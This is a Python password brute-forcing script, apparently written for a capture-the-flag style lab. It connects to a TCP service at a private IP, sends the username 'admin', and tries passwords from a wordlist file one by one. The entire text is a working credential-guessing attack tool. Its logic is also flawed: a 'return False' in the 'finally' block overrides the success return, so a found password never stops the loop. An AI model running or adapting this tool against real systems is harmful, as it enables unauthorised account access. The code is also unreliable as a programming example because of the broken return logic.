import socket

# Configuration
target_ip = "10.10.135.161"  # Target IP
target_port = 8000           # Target port
password_wordlist = "passwords.txt"  # Path to your password wordlist file

def connect_and_fuzz_password(password):
    try:
        # Create a socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))

        # Send 'admin' to the server
        client_socket.sendall('admin\r\n'.encode('utf-8'))

        # Receive the response from the server after sending 'admin'
        response = client_socket.recv(1024).decode('utf-8')
        print(f"Server response after sending 'admin': {response}")

        # Wait for the server to send "Password:"
        if "Password:" in response:
            print(f"Trying password: {password}")
            # Send password to the server
            client_socket.sendall(f'{password}\r\n'.encode('utf-8'))

            # Receive the response after sending the password
            response = client_socket.recv(1024).decode('utf-8')
            print(f"Response after sending password: {response}")

            if "Password:" not in response:
                print(f"Correct password found: {password}")
                return True  # Password is correct

            print(f"Password '{password}' is incorrect.")

        else:
            print("Did not receive the 'Password:' prompt.")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        client_socket.close()
        return False

def fuzz_passwords():
    # Open the password wordlist file
    with open(password_wordlist, "r", encoding="utf-8", errors="ignore") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any newline characters
        if connect_and_fuzz_password(password):
            print(f"Correct password found: {password}")
            break  # Stop if the correct password is found
        else:
            print(f"Password {password} was incorrect. Trying next...")

if __name__ == "__main__":
    fuzz_passwords()
